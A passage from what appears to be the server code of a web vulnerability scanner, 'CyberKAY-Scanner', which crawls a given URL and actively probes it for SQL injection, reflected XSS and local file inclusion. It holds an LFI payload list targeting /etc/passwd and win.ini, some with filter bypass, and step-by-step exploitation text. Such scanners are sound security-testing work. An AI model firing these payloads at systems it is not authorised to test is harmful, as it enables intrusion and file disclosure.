                location: testUrl,
                payload: payload,
                evidence: `Extracted Data: ${markerMatch[1]}`, // The content between markers
                exploitationSteps: generateHackerScenario('Standard', key, payload)
             });
        }

      } catch (e) { /* ignore fetch errors */ }
    }
  }
  return vulns;
}

// --- XSS Scanner ---

async function scanXSS(url: string): Promise<VulnerabilityReport[]> {
  const vulns: VulnerabilityReport[] = [];
  const target = new URL(url);
  const params = target.searchParams;

  for (const [key, value] of params.entries()) {
    for (const payload of XSS_PAYLOADS) {
      const testParams = new URLSearchParams(params);
      testParams.set(key, payload);
      const testUrl = `${target.origin}${target.pathname}?${testParams.toString()}`;

      try {
        const res = await fetch(testUrl, { headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' }, signal: AbortSignal.timeout(5000) });
        const text = await res.text();

        if (text.includes(payload)) {
          vulns.push({
            type: 'Reflected XSS',
            severity: 'High',
            description: `The application reflects user input from the '${key}' parameter without proper sanitization. This allows attackers to execute arbitrary JavaScript in the victim's browser.`,
            recommendation: 'Contextually encode all user data before rendering it in the HTML. Use Content Security Policy (CSP) to mitigate the impact.',
            location: testUrl,
            payload: payload,
            evidence: `Payload found in response body`,
            exploitationSteps: `1. Craft a URL with the payload in the '${key}' parameter.\n2. Send the URL to a victim.\n3. When the victim visits the link, the script executes.`
          });
          break; 
        }
      } catch (e) {}
    }
  }
  return vulns;
}

// --- Main Scan Logic ---

const LFI_PAYLOADS = [
  "../../../../etc/passwd",
  "../../../../../../../../etc/passwd",
  "/etc/passwd",
  "../../../../windows/win.ini",
  "../../../../../../../../windows/win.ini",
  "C:/Windows/win.ini",
  "....//....//....//etc/passwd", // Filter bypass
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL Encoded
  "file:///etc/passwd"
];

const LFI_PARAMS = [
  "file", "page", "path", "include", "template", "view", "doc", "document", "filename", "read"
];

async function scanLFI(url: string, deadline: number): Promise<VulnerabilityReport[]> {
  const vulns: VulnerabilityReport[] = [];
  const target = new URL(url);
  const params = target.searchParams;

  // Check if any parameter is a common LFI target
  const vulnerableParams = [...params.keys()].filter(p => LFI_PARAMS.includes(p.toLowerCase()));
  
  // If no common params, check all params anyway (more aggressive)
  const paramsToCheck = vulnerableParams.length > 0 ? vulnerableParams : [...params.keys()];

  for (const key of paramsToCheck) {
    if (Date.now() > deadline) break;

    for (const payload of LFI_PAYLOADS) {
      if (Date.now() > deadline) break;

      const testParams = new URLSearchParams(params);
      testParams.set(key, payload);
      const testUrl = `${target.origin}${target.pathname}?${testParams.toString()}`;

      try {
        const res = await fetch(testUrl, { 
            headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' },
            signal: AbortSignal.timeout(5000)
        });
        const text = await res.text();

        // Check for indicators
        if (
            text.includes("root:x:0:0:") || // Linux /etc/passwd
            text.includes("[extensions]") || // Windows win.ini
            text.includes("[fonts]") // Windows win.ini
        ) {
          vulns.push({
            type: 'Local File Inclusion (LFI)',
            severity: 'Critical',
            description: `The application allows reading local files via the '${key}' parameter. This can lead to sensitive data exposure and potential RCE.`,
            recommendation: 'Validate user input against a whitelist of allowed files. Do not use user input directly in file system calls.',
            location: testUrl,
            payload: payload,
            evidence: text.substring(0, 200), // First 200 chars as evidence
            exploitationSteps: `1. Identify the vulnerable parameter '${key}'.\n2. Inject the payload '${payload}'.\n3. Observe the contents of the system file in the response.`
          });
          break; // Stop testing this parameter if vuln found
        }
      } catch (e) {}
    }
  }
  return vulns;
}

// --- SSE Setup ---
let clients: { id: number; res: express.Response }[] = [];

function sendProgress(data: any) {
  clients.forEach(client => {
    client.res.write(`data: ${JSON.stringify(data)}\n\n`);
  });
}

async function fullScan(targetUrl: string): Promise<ScanResult> {
  const deadline = Date.now() + SCAN_TIMEOUT_MS;

  sendProgress({ type: 'status', message: 'Starting crawl...' });

  // 1. Crawl (Limit to 10 pages as requested)
  const crawledUrls = await crawl(targetUrl, 40);
  
  sendProgress({ type: 'status', message: `Crawl complete. Found ${crawledUrls.length} pages.` });
  
  let allVulns: VulnerabilityReport[] = [];
  let mainHeaders: Record<string, string> = {};

  // 2. Scan each found URL
  for (let i = 0; i < crawledUrls.length; i++) {
    const url = crawledUrls[i];
    if (Date.now() > deadline) break; // Global timeout check

    sendProgress({ 
      type: 'progress', 
      current: i + 1, 
      total: crawledUrls.length, 
      url: url,
      message: `Scanning ${url}`
    });

    // Passive
    const passive = await scanPassive(url);
    if (url === targetUrl || url === targetUrl + '/') {
        mainHeaders = passive.headers;
    }
    allVulns.push(...passive.vulns);

    // Active (SQLi & XSS)
    const sqli = await scanSQLInjection(url, deadline);
    allVulns.push(...sqli);

    // Active Header/Cookie Injection
    const headerVulns = await scanHeadersAndCookies(url, deadline);
    allVulns.push(...headerVulns);

    const xss = await scanXSS(url);
    allVulns.push(...xss);

    // Active LFI Scan
    const lfi = await scanLFI(url, deadline);
    allVulns.push(...lfi);

    // Active POST Scan (SQLi & XSS)
    if (passive.forms && passive.forms.length > 0) {
      const postVulns = await scanPostVulnerabilities(url, passive.forms, deadline);
      allVulns.push(...postVulns);
    }
  }

  // Deduplicate vulns (consider payload for injection types)
  const uniqueVulns = allVulns.filter((v, i, a) => 
    a.findIndex(t => {
      if (t.type !== v.type || t.location !== v.location) return false;
      
      // For injection attacks, also check payload to allow multiple findings
      if (v.type.includes('SQL') || v.type.includes('XSS') || v.type.includes('LFI')) {
        return t.payload === v.payload;
      }
      
      return true;
    }) === i
  );

  sendProgress({ type: 'complete', message: 'Scan complete.' });

  return {
    target: targetUrl,
    timestamp: new Date().toISOString(),
    score: calculateScore(uniqueVulns),
    crawledUrls,
    vulnerabilities: uniqueVulns,
    headers: mainHeaders
  };
}

interface FormInput {
  name: string;
  type?: string;
  value?: string;
}

interface Form {
  action: string;
  method: string;
  inputs: FormInput[];
}

async function scanPostVulnerabilities(pageUrl: string, forms: Form[], deadline: number): Promise<VulnerabilityReport[]> {
  const vulns: VulnerabilityReport[] = [];
  
  for (const form of forms) {
    if (Date.now() > deadline) break;
    if (form.method.toUpperCase() !== 'POST') continue;

    // Construct target URL (handle relative actions)
    let targetAction = form.action || pageUrl;
    try {
      targetAction = new URL(targetAction, pageUrl).toString();
    } catch (e) {
      continue; // Skip invalid actions
    }

    // 1. Test SQL Injection on POST
    for (const input of form.inputs) {
      if (Date.now() > deadline) break;
      if (!input.name || input.type === 'submit' || input.type === 'button') continue;

      for (const payload of SQL_PAYLOADS) {
        if (Date.now() > deadline) break;

        // Construct form data
        const formData = new URLSearchParams();
        form.inputs.forEach(inp => {
          if (inp.name) {
            formData.append(inp.name, inp.name === input.name ? payload : (inp.value || 'test'));
          }
        });

        try {
          const res = await fetch(targetAction, {
            method: 'POST',
            headers: { 
              'User-Agent': 'CyberKAY-Scanner/2.0',
              'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData.toString(),
            signal: AbortSignal.timeout(5000)
          });
          const text = await res.text();

          // Check for SQL errors
          if (SQL_ERRORS.some(err => err.test(text))) {
             vulns.push({
              type: 'SQL Injection (POST)',
              severity: 'Critical',
              description: `The application returns database errors when injecting SQL syntax into the '${input.name}' POST parameter.`,
              recommendation: 'Use parameterized queries (Prepared Statements). Sanitize all user input.',
              location: targetAction,
              payload: payload,
              evidence: text.substring(0, 200),
              exploitationSteps: `1. Submit the form to '${targetAction}'.\n2. Set '${input.name}' to '${payload}'.\n3. Observe the database error.`
            });
            break; // Stop testing this input for SQLi if found
          }
        } catch (e) {}
      }
    }

    // 2. Test XSS on POST
    for (const input of form.inputs) {
      if (Date.now() > deadline) break;
      if (!input.name || input.type === 'submit' || input.type === 'button') continue;

      for (const payload of XSS_PAYLOADS) {
        if (Date.now() > deadline) break;

        const formData = new URLSearchParams();
        form.inputs.forEach(inp => {
          if (inp.name) {
            formData.append(inp.name, inp.name === input.name ? payload : (inp.value || 'test'));
          }
        });

        try {
          const res = await fetch(targetAction, {
            method: 'POST',
            headers: { 
              'User-Agent': 'CyberKAY-Scanner/2.0',
              'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: formData.toString(),
            signal: AbortSignal.timeout(5000)
          });
          const text = await res.text();

          if (text.includes(payload)) {
             vulns.push({
              type: 'Reflected XSS (POST)',
              severity: 'High',
              description: `The application reflects POST data without sanitization in the response.`,
              recommendation: 'Contextually encode all user data before rendering. Use CSP.',
              location: targetAction,
              payload: payload,
              evidence: `Payload found in response body`
            });
            break; 
          }
        } catch (e) {}
      }
    }
  }

  return vulns;
}

async function scanPassive(url: string): Promise<{ vulns: VulnerabilityReport[], headers: Record<string, string>, forms: Form[] }> {
  const vulns: VulnerabilityReport[] = [];
  let headers: Record<string, string> = {};
  const extractedForms: Form[] = [];

  try {
    const response = await fetch(url, { headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' } });
    const text = await response.text();
    response.headers.forEach((v, k) => headers[k.toLowerCase()] = v);
    const $ = cheerio.load(text);

    // Extract Forms
    $('form').each((i, el) => {
      const method = $(el).attr('method')?.toUpperCase() || 'GET';
      const action = $(el).attr('action') || '';
      const inputs: FormInput[] = [];
      
      $(el).find('input, textarea, select').each((j, inp) => {
        const name = $(inp).attr('name');
        if (name) {
          inputs.push({
            name,
            type: $(inp).attr('type'),
            value: $(inp).val() as string || ''
          });
        }
      });
      
      extractedForms.push({ action, method, inputs });
    });

    // 1. Headers Checks
    if (!headers['content-security-policy']) {
      vulns.push({
        type: 'Missing Content-Security-Policy',
        severity: 'Medium',
        description: 'No CSP header found. This increases XSS risk.',
        recommendation: 'Implement a strict CSP.',
        location: 'HTTP Headers'
      });
    }
    if (!headers['x-frame-options']) {
      vulns.push({
        type: 'Missing X-Frame-Options',
        severity: 'Low',
        description: 'Vulnerable to Clickjacking.',
        recommendation: 'Set X-Frame-Options to DENY or SAMEORIGIN.',
        location: 'HTTP Headers'
      });
    }
    if (headers['server'] || headers['x-powered-by']) {
      vulns.push({
        type: 'Information Disclosure (Headers)',
        severity: 'Info',
        description: `Server details exposed: ${headers['server'] || ''} ${headers['x-powered-by'] || ''}`,
        recommendation: 'Remove server version headers.',
        location: 'HTTP Headers'
      });
    }

    // 2. HTML Checks (CSRF & Key Leakage)
    const forms = $('form');
    forms.each((i, el) => {
      if (!$(el).find('input[name*="csrf"], input[name*="token"]').length && $(el).attr('method')?.toLowerCase() === 'post') {
        vulns.push({
          type: 'Missing CSRF Token',
          severity: 'Medium',
          description: 'POST form found without apparent CSRF token.',
          recommendation: 'Add anti-CSRF tokens to all state-changing forms.',
          location: `Form #${i+1} on ${url}`
        });
      }
    });

    // 3. Sensitive Data in Source
    if (text.match(/-----BEGIN RSA PRIVATE KEY-----/)) {
      vulns.push({
        type: 'Private Key Leakage',
        severity: 'Critical',
        description: 'Found what looks like an RSA private key in the HTML source.',
        recommendation: 'Rotate keys immediately and remove from source.',
        location: url
      });
    }

  } catch (e) {
    console.error("Passive scan failed", e);
  }

  return { vulns, headers, forms: extractedForms };
}

// --- Server Setup ---

async function startServer() {
  const app = express();

  app.use(express.json());

  // SSE Endpoint
  app.get('/api/scan-progress', (req, res) => {
    const headers = {
      'Content-Type': 'text/event-stream',
      'Connection': 'keep-alive',
      'Cache-Control': 'no-cache'
    };
    res.writeHead(200, headers);

    const clientId = Date.now();
    const newClient = {
      id: clientId,
      res
    };
    clients.push(newClient);

    req.on('close', () => {
      clients = clients.filter(client => client.id !== clientId);
    });
  });

  app.post('/api/scan', async (req, res) => {
    const { url } = req.body;
    if (!url) {
        res.status(400).json({ error: 'URL is required' });
        return;
    }

    try {
      let target = url;
      if (!target.startsWith('http')) target = `https://${target}`;
      
      // Validate connectivity first
      try {
          // Try HEAD first with a longer timeout
          await fetch(target, { 
            method: 'HEAD', 
            headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' },
            signal: AbortSignal.timeout(10000) 
          });
      } catch (e) {
          // If HEAD fails, try GET (some servers block HEAD)
          try {
             await fetch(target, { 
               method: 'GET', 
               headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' },
               signal: AbortSignal.timeout(10000) 
             });
          } catch (err) {
             // If https fails, try http as a fallback if the user didn't explicitly specify protocol
             if (url.startsWith('http')) {
                throw new Error(`Target unreachable: ${target}. The server might be down or blocking requests.`);
             }
             
             try {
                target = `http://${url}`;
                await fetch(target, { 
                   method: 'GET', 
                   headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' },
                   signal: AbortSignal.timeout(10000) 
                });
             } catch (finalErr) {
                throw new Error(`Target unreachable: ${url}. Tried both HTTPS and HTTP.`);
             }
          }
      }

      const result = await fullScan(target);
      res.json(result);

    } catch (error: any) {
      console.error('Scan failed:', error);
      res.status(500).json({ error: error.message || 'Internal Server Error' });
    }
  });

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();

